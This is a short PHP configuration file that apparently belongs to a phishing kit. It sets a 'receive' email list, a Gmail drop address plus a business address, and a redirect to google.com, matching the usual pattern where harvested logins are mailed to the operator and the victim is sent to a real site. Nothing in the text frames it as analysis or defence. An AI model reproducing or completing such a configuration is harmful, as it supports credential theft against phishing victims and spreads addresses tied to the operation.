<?php 
$Receive_email="rsltssbxxes@gmail.com, simon@shopshiretrading.com";
$redirect="https://www.google.com/";
?>